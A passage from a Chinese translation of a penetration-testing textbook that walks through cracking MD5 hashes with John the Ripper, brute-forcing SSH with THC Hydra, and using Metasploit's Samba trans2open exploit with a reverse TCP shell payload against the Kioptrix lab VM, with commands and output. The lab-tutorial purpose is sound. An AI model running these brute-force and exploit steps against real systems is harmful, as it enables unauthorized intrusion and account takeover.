John 将开始尝试对 MD5 密码进行暴力破解。

```
Loaded 3 password hashes with 3 different salts (FreeBSD MD5 [32/64 X2])

```

### 注意

如果您幸运或极其耐心，您将获得目标机器的未加密密码。根据密码复杂性和系统速度的组合，此步骤可能需要从几分钟到几周不等的时间。有第三方服务可用于破解密码，但在使用这些服务时必须在您的规则中明确允许，因为您将失去对发送到第三方的任何数据的控制。

## 暴力破解密码

暴力破解仍然是一种非常可行的获得对机器访问权限的方法。密码的问题在于人们必须能够随时记住它们。试图记住 233！sdsfF_DaswsaWlsc!!&$#_ 对大多数人来说可能会很困难，因此我们最终会得到一个常用密码的短列表，如 ILoveKellie1！。这个问题在于有几种方法可以缩小可能密码列表的范围，并且当前的计算机在家用台式机上拥有多达 8 个处理器核心。

### 提示

密码破解可以通过使用多个视频卡和它们的 GPU 来完成。如果资源可用，这是首选方法。

尽管密码 ILoveKellie1！符合许多强制密码策略，但您可以轻松地制作一个密码列表，附加某些常用字符，如！，1，2 等等，通过阅读本书的开头，您将能够确定我的配偶的名字是 Kellie。如果您在创建您的单词列表时聪明地使用常用术语，如 ILove，Iam 等，那么其他部分将变得微不足道。现代密码暴力破解技术将在短短片刻内破解此密码。这使得破解密码变得比以往更快更容易。在这里，我们将看一些暴力破解这些密码的方法。

### 注意

请注意，本书中使用的许多示例都经过简化，以使概念更容易学习。一旦您理解了这些概念，您将能够在实际网络上执行相同的技术。

## THC Hydra

THC Hydra 使检查弱密码的任务变得有趣。它是根据 GPLv3 发布的，并由 THC 团队不断更新。有关该产品的更新信息可以通过浏览[`www.thc.org/thc-hydra/`](http://www.thc.org/thc-hydra/)找到。

### 注意

THC Hydra 目前支持 40 多种服务，包括 FTP、MySQL、POP3、SSH2、VNC 等等。

我们将启动我们的虚拟实验室，并开始使用包含在 BackTrack 5 中的 THC Hydra。让我们连接到 Kioptrix 机器并创建一个帐户，以便我们可以看到 Hydra 在查找密码时的表现。在 BackTrack 机器上加载我们之前使用的 Samba 漏洞利用程序：

```
# ./SambaVuln_10 -b 0 192.168.75.14 

```

连接后，输入以下内容以更改`harold`帐户的密码：

```
passwd Harold
New password: lotsOfPasswords
Retype new passwords: lotsOfPasswords 

```

与许多工具一样，确定语法的最快方法是在没有任何额外输入的情况下调用程序。

```
# hydra 

```

命令语法将显示在输出中：

```
Hydra v7.0 (c)2011 by van Hauser/THC & David Maciejak - for legal purposes only
Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SuvV46] [server service [OPT]]|[service://server[:PORT][/OPT]]

```

Hydra 可以从命令提示符中使用，但它也有一个可以通过以下方式调用的漂亮的 GUI：

```
# xhydra 

```

这个命令将启动 GUI，并呈现给我们以下内容：

![THC Hydra](img/7744_04_10.jpg)

### 注意

我们将使用 BackTrack 中包含的密码文件，但理想情况下，你将下载或创建自己的密码文件，特别是如果你能够获取关于客户网站或元数据的公司特定信息。我强烈建议你查看 cewl（由 DigiNinja 编写，并预装在 Backtrack 上）[`www.digininja.org/projects/cewl.php`](http://www.digininja.org/projects/cewl.php)。

为了对我们的 Kioptrix 机器执行简单的暴力破解攻击，我们必须选择以下设置：

+   目标选项卡

+   单个目标：192.168.75.14（Kioptrix 虚拟机）

+   端口：22

+   协议：SSH

+   检查以下选项：详细说明，显示尝试

+   密码选项卡

+   用户名：Harold

+   密码：lotsOfPasswords

+   检查：尝试使用密码登录，尝试空密码

+   其他一切默认

转到**开始**选项卡，然后在屏幕底部点击**开始**按钮。你将看到以下内容：

![THC Hydra](img/7744_04_11.jpg)

好吧，我们成功猜到了一个我们已经知道密码的帐户的密码...并不是很令人兴奋，但它确实让你知道，有简单的方法可以验证帐户登录是否准确，而无需登录到必要的客户端（例如检查 SNMP 或 TFTP）。

让我们把我们的密码添加到 BackTrack 5 中包含的字典中。打开一个终端会话，然后输入：

```
# /pentest/passwords/wordlists 

```

这将带你到单词列表目录。

### 提示

在单词列表目录中有一个名为`darkc0de.lst`的文件，可以帮助你入门。看看这个文件，了解一个典型的单词列表会包含什么。

这是一个非常方便的地方，可以存储所有个人的单词列表。许多测试人员会有几个喜欢的单词列表，并根据需要即时创建单词列表。让我们把我们的密码添加到这个列表中。编辑`darkc0de.lst`，使其看起来像这样：

```
^
^[^[
^[^[^[
^[^[^[^[
^[^[^[^[^[
^[^[^[^[^[^[
^[^[^[^[^[^[^[
^[^[^[^[^[^[^[^[
!magnus
!power
"A" SIDES
"DETROIT" GARY & CC TH WIGGINS
lotsOfPasswords 
#
#

```

我们已经将测试添加到了这个密码文件的头部，以便更快地找到它。

再次打开 Xhydra，并选择以下选项：

+   目标选项卡

+   单个目标：192.168.75.14（Kioptrix 虚拟机）

+   端口：22

+   协议：SSH

+   检查以下选项：详细说明，显示尝试

+   密码选项卡

+   用户名：Harold

+   密码列表：已选择，点击条目字段选择`/pentest/passwords/wordlists/darkc0de.lst`

+   检查：尝试使用密码登录，尝试空密码

+   调整

+   任务数量：1

+   在找到第一对后退出：已选中

+   其他一切默认

再次转到开始选项卡，然后在窗口右下角点击开始：

![THC Hydra

Hydra THC 对任何人的工具箱都是一个明显的好处，它的使用应该得到练习和完善，才能真正成功地渗透复杂的网络，其中密码可能是整个安全架构中最薄弱的环节。

# Metasploit-学习并喜欢它

Metasploit™框架是令人难以置信的。它以友好、易于使用的方式为渗透测试人员提供了各种工具。它最初是由 HD Moore 创建的，最近被 Rapid7 收购，Rapid7 是 Nexpose 漏洞扫描工具包的创建者。我们手动完成的所有工作都可以用 Metasploit 完成。如果您是渗透测试的新手，我强烈建议您通过[`www.offensive-security.com/metasploit-unleashed/Metasploit_Unleashed_Information_Security_Training`](http://www.offensive-security.com/metasploit-unleashed/Metasploit_Unleashed_Information_Security_Training)提供的免费培训，真正了解这个框架的强大之处。该网站不断更新，应该经常访问，以获取有关 MSF 框架最新添加的信息。在本书中，我们将范围限制在 MSF 框架的一些更有趣的功能上，以突出它为渗透测试人员必须完成的工作增加的效率。

## 更新 Metasploit 框架

一如既往，经常更新应用程序非常重要。在这方面，Metasploit 也不例外。您应该至少每周更新一次 Metasploit 框架的安装。这个命令非常容易记住。您可以在 BackTrack shell 中运行该命令，而不管当前的工作目录是什么。在更新之前，请确保您的 BackTrack 实验室机器已连接到互联网。

```
#msfupdate 

```

更新完成后，您应该会收到更新通知，然后是命令提示符：

```
Updated to revision <new revision number>
root@bt:~#

```

您还将在 Metasploit 标题屏幕上看到一个信息丰富的部分，提醒您上次更新的内容：

```
# msfconsole 

```

这个命令将产生类似以下的输出：

```
_ _
/ \ / \ __ _ __ /_/ __
| |\ / | _____ \ \ ___ _____ | | / \ _ \ \
| | \/| | | ___\ |- -| /\ / __\ | -__/ | | | | || | |- -|
|_| | | | _|__ | |_ / -\ __\ \ | | | |_ \__/ | | | |_
|/ |____/ \___\/ /\ \___/ \/ \__| |_\ \___\
=[ metasploit v4.2.0-dev [core:4.2 api:1.0]
+ -- --=[ 762 exploits - 404 auxiliary - 117 post
+ -- --=[ 228 payloads - 27 encoders - 8 nops
=[ svn r14271 updated today (2011.11.16) 
msf >

```

请注意，上次更新的日期和`svn`号码会作为输出的一部分呈现。

### 注意

现在可能是更新您的 BackTrack 虚拟机的好时机。在更新 Metasploit 框架之前，您应该先更新 BackTrack。

## 数据库和 Metasploit

我最喜欢的 Metasploit 功能之一是能够将所有结果转储到数据库中。Metasploit 默认使用 PostgreSQL。

### 注意

安装 PostgreSQL 可能并不是必需的。尝试在 MSF 上下文中连接到数据库，如果遇到错误，请按照完整的安装过程再次尝试。

### 在 BackTrack 5 上安装 PostgreSQL

我们需要重新连接我们的 BackTrack 5 虚拟机，以便再次下载和安装 PostgreSQL。一旦您已经验证了您的连接性，请键入以下内容：

```
# apt-get install postgresql 

```

阅读说明并按*Y*继续。安装应该以类似以下的声明结束：

```
Setting up postgresql (8.4.8-0ubuntu0.10.04) ...

```

现在我们需要对安装进行一些修改：

```
# sudo su postgres -c psql 

```

```
could not change directory to "/root"
psql (8.4.8)
Type "help" for help.

```

安装了 postgres 后，我们会看到以下提示，让我们知道我们正在数据库控制台中工作：

```
postgres=#

```

我们现在将更改默认数据库用户的密码：

```
postgres=# ALTER USER postgres WITH PASSWORD 'myPassword'; 

```

```
ALTER ROLE

```

在这里，我们更改了 postgre 角色的密码。我们将使用`\q`退出 postgres 控制台。

```
postgres=# \q 

```

### 验证数据库连接

加载 Metasploit 控制台：

```
# msfconsole 

```

在`msf >`提示符下键入：

```
msf> db_connect postgres:myPassword@127.0.0.1/pentester
msf> db_status

```

```
[*] postgresql connected to pentester

```

现在我们知道我们连接到名为 pentester 的 PostgreSQL 数据库。我们可以通过输入以下内容来验证连接：

```
msf> hosts 

```

```
Hosts
=====
address mac name os_name os_flavor os_sp purpose info comments
------- --- ---- ------- --------- ----- ------- ---- --------

```

上一个命令将为我们提供主机列表。正如你所看到的，目前还没有什么有趣的东西。

### 在 Metasploit 中执行 Nmap 扫描

当运行主机命令时，我们需要一些令人兴奋的内容，所以让我们运行一个快速的 nmap 扫描来收集一些数据。打开`msfconsole`并连接到数据库后，我们现在可以直接从 Metasploit 运行我们的 nmap 扫描。

```
msf> db_nmap -nO -sTU -pT:22,80,111,139,443,32768,U:111,137,32768 192.168.75.14 

```

结果看起来非常熟悉，而且还有一个额外的好处，就是已经被添加到数据库以供将来参考：

```
[*] Nmap: Starting Nmap 5.51SVN ( http://nmap.org ) at 2011-11-16 21:47 EST
[*] Nmap: Nmap scan report for 192.168.75.14
[*] Nmap: Host is up (0.00059s latency).
[*] Nmap: PORT STATE SERVICE
[*] Nmap: 22/tcp open ssh
[*] Nmap: 80/tcp open http
[*] Nmap: 111/tcp open rpcbind
[*] Nmap: 139/tcp open netbios-ssn
[*] Nmap: 443/tcp open https
[*] Nmap: 32768/tcp open filenet-tms
[*] Nmap: 111/udp open rpcbind
[*] Nmap: 137/udp open netbios-ns
[*] Nmap: 32768/udp open|filtered omad
[*] Nmap: MAC Address: 08:00:27:21:21:62 (Cadmus Computer Systems)
[*] Nmap: Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 2.4.X
[*] Nmap: OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
[*] Nmap: Network Distance: 1 hop
[*] Nmap: OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 3.00 seconds

```

如果我们运行快速的`hosts`命令，我们会看到系统已经添加到我们的 PostgreSQL 渗透测试数据库中：

```
msf > hosts 

```

```
Hosts
=====
address mac name os_name os_flavor os_sp purpose info comments
------- --- ---- ------- --------- ----- ------- ---- --------
192.168.75.14 08:00:27:21:21:62 Linux 2.4.X device

```

现在数据已经在数据库中，我们可以执行各种方便的节省时间的技巧。例如，如果我们想要查看哪些系统打开了 443 端口，我们可以输入：

```
msf > services -p 443 

```

这为我们提供了一个格式良好的输出列表，列出了所有打开 443 端口的系统：

```
Services
========
host port proto name state info
---- ---- ----- ---- ----- ----
192.168.75.14 443 tcp https open

```

### 使用辅助模块

```
msf > use auxiliary/scanner/portscan/tcp

```

使用命令指示 Metasploit 使用指定的模块。

```
msf auxiliary(tcp) > show options

```

每个模块都有一组特定的选项，可以通过`show options`命令显示。这个特定的模块有以下可以更改的选项：

```
Module options (auxiliary/scanner/portscan/tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
CONCURRENCY 10 yes The number of concurrent ports to check per host
FILTER no The filter string for capturing traffic
INTERFACE no The name of the interface
PCAPFILE no The name of the PCAP capture file to process
PORTS 1-10000 yes Ports to scan (e.g. 22-25,80,110-900)
RHOSTS yes The target address range or CIDR identifier
SNAPLEN 65535 yes The number of bytes to capture
THREADS 1 yes The number of concurrent threads
TIMEOUT 1000 yes The socket connect timeout in milliseconds

```

我们需要更改其中一些以适应我们的需求：

```
msf auxiliary(tcp) > set RHOSTS 192.168.75.14
,

```

`RHOSTS`是我们的目标范围。我们将其设置为`192.168.75.14:`

```
msf auxiliary(tcp) > set PORTS 1-1024 

```

为了节省时间，我们将扫描限制在前 1024 个端口，使用`set PORTS`设置。

```
msf auxiliary(tcp) > run 

```

`run`命令将使用我们预定的设置启动扫描。几分钟后，我们将从控制台收到反馈：

```
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

这里需要注意的重要事项是，所有模块都以相同的方式运行。一旦您了解了搜索漏洞的方法，您将能够重复使用相同的步骤。

## 使用 Metasploit 来利用 Kioptrix

现在是时候看看如何使用 Metasploit 对我们的 Kioptrix 机器进行攻击了。由于我们知道如何编译和使用互联网上提供的概念验证代码，我们将能够快速体会到 Metasploit 提供的时间节省。我们将首先连接到我们的数据库。

```
# msfconsole
msf > db_connect postgres:myPassword@127.0.0.1/pentester

```

我们应该已经在我们的数据库中有一些信息。这可以得到验证：

```
msf > services 

```

这个命令给我们提供了以下输出：

```
Services
========
host port proto name state info
---- ---- ----- ---- ----- ----
192.168.75.14 22 tcp ssh open
192.168.75.14 80 tcp http open
192.168.75.14 111 udp rpcbind open
192.168.75.14 111 tcp rpcbind open
192.168.75.14 137 udp netbios-ns open
192.168.75.14 139 tcp netbios-ssn open
192.168.75.14 443 tcp https open
192.168.75.14 32768 tcp filenet-tms open
192.168.75.14 32768 udp omad open

```

在审查这些端口时，我们发现我们之前利用的 samba 端口 139 仍然是开放的。现在是时候看看在不必重新格式化利用代码的情况下我们能做些什么了。

```
msf> search samba 

```

结果是：

![使用 Metasploit 来利用 Kioptrix](img/7744_04_13.jpg)

+   名称：一旦我们决定尝试哪种漏洞利用，名称列将与 USE 命令相关联。

+   披露：披露日期是漏洞被公开或供应商知晓的实际日期，而不是概念验证代码发布的日期。

+   等级：等级非常重要，因为它表明漏洞利用的可靠性有多高。

+   描述也是这种漏洞利用的描述。

我们将使用`trans2open`漏洞利用，因为它类似于我们在本章前手动执行的操作。在`msfconsole`中输入：

```
msf > use exploit/linux/samba/trans2open 

```

当需要更多关于漏洞利用的信息时，我们可以使用`info`命令来接收以下输出：

```
msf exploit(trans2open) > info 

```

```
Name: Samba trans2open Overflow (Linux x86)
Module: exploit/linux/samba/trans2open
Version: 12196
Platform: Linux
Privileged: Yes
License: Metasploit Framework License (BSD)
Rank: Great
Provided by:
hdm <hdm@metasploit.com>
jduck <jduck@metasploit.com>
Available targets:
Id Name
-- ----
0 Samba 2.2.x - Bruteforce
Basic options:
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 139 yes The target port
Payload information:
Space: 1024
Avoid: 1 characters
Description:
This exploits the buffer overflow found in Samba versions 2.2.0 to
2.2.8\. This particular module is capable of exploiting the flaw on
x86 Linux systems that do not have the noexec stack option set.
NOTE: Some older versions of RedHat do not seem to be vulnerable
since they apparently do not allow anonymous access to IPC.
References:
http://cve.mitre.org/cgi-bin/cvename.cgi?name=2003-0201
http://www.osvdb.org/4469
http://www.securityfocus.com/bid/7294
http://seclists.org/bugtraq/2003/Apr/103

```

Metasploit 中的所有漏洞利用都提供这些信息。如果时间允许，花时间熟悉一些最常用的漏洞利用将对长远非常有益，因为您将能够避免尝试在生产系统上不起作用的漏洞利用。

现在我们需要设置一些可用的选项：

```
msf > set RHOST 192.168.75.14 

```

`RHOST`是远程主机，需要设置为我们的 Kioptrix 机器的 IP 地址。

```
msf > show payloads 

```

![使用 Metasploit 来利用 Kioptrix](img/7744_04_14.jpg)

`show payloads`命令提供了可以与特定漏洞利用一起使用的所有兼容负载的列表。我们将在本例中使用`reverse_tcp`。这种负载类型通常很小且有效，尽管它没有 meterpreter 提供的全部选项。

```
> set payload linux/x86/shell/reverse_tcp 

```

我们还需要设置`LHOST`和`LPORT`。 

```
> set LHOST 192.168.75.12 

```

这是我们的本地主机，监听器将在上面设置。

```
> set LPORT 2222 

```

这是我们想要监听的端口。

现在这件事已经解决，我们可以继续进行利用：

```
> exploit 

```

如果一切顺利，您将收到以下确认和一个类似于我们在本章前手动编译的漏洞利用为我们提供的连接。

```
msf exploit(trans2open) > exploit 

```

```
[*] Started reverse handler on 192.168.75.12:2221
[*] Trying return address 0xbffffdfc...
[*] Trying return address 0xbffffcfc...
[*] Trying return address 0xbffffbfc...
[*] Trying return address 0xbffffafc...
[*] Sending stage (36 bytes) to 192.168.75.14
[*] Command shell session 2 opened (192.168.75.12:2221 -> 192.168.75.14:32802) at 2011-11-16 23:22:06 -0500

```

为了确保我们有 root 权限，我们将执行以下命令：

```
# mail

```

```
Mail version 8.1 6/6/93\. Type ? for help.
"/var/mail/root": 6 messages 6 unread
>U 1 root@kioptix.level1 Sat Sep 26 11:42 15/481 "About Level 2"
U 2 root@kioptrix.level1 Thu Nov 10 19:34 19/534 "LogWatch for kioptrix"
U 3 root@kioptrix.level1 Fri Nov 11 14:38 48/1235 "LogWatch for kioptrix"
U 4 root@kioptrix.level1 Sun Nov 13 15:12 19/534 "LogWatch for kioptrix"
U 5 root@kioptrix.level1 Mon Nov 14 18:23 244/12279 "LogWatch for kioptrix"
U 6 root@kioptrix.level1 Wed Nov 16 15:19 19/534 "LogWatch for kioptrix"

```

我们正在查看 root 帐户的消息，并且可以看到 Loneferret 给我们留了一条不错的消息；输入 1 来阅读它：

```
# 1

```

```
Message 1:
From root Sat Sep 26 11:42:10 2009
Date: Sat, 26 Sep 2009 11:42:10 -0400
From: root <root@kioptix.level1>
To: root@kioptix.level1
Subject: About Level 2
If you are reading this, you got root. Congratulations.
Level 2 won't be as easy...

```

最后一个练习应该已经清楚地表明，与手动查找和编译代码相比，使用 Metasploit 是轻而易举的。最好的部分是，您将能够将自己的模块和编译代码添加到框架中。

# 总结

本章对利用进行了扎实的介绍。通过利用 Kioptrix，这是一个有意设置的易受攻击的 Linux 发行版，我们能够实际练习在 Exploit-DB 和 BackTrack 上定位漏洞，并纠正我们发现的任何错误。我们研究了真正理解渗透测试利用阶段所需的步骤，如横幅抓取和在受攻击的机器上传输文件。

我们研究了使用 John the Ripper 和 THC Hydra 进行密码破解和暴力破解，这两者都需要深入理解，以便为后续章节做准备。密码破解在短期内不会消失，对这个主题的专业知识在长期内可能非常有益。

本章还涵盖了将文件传输到受攻击的机器以及从中传输文件所需的步骤；这包括设置和配置与 BackTrack 5 预装的 FTP 守护程序。

最后，我们总结了 Metasploit 以及它如何简化渗透测试任务的方式。通过实际操作，很快就清楚地看到，尽管手动查找和编译利用代码可能有益，但使用 Metasploit 可以显著提高整体生产力。

在下一章中，我们将讨论测试 Web 应用程序及其基础架构安全所需的技术。这包括负载均衡器和 Web 应用程序防火墙的检测。还讨论了诸如 w3af 和 Webscarab 之类的工具的使用。此外，我们的虚拟实验室得到了极大的扩展，包括了 pfSense 和 Kioptrix Level 3 等多台机器。
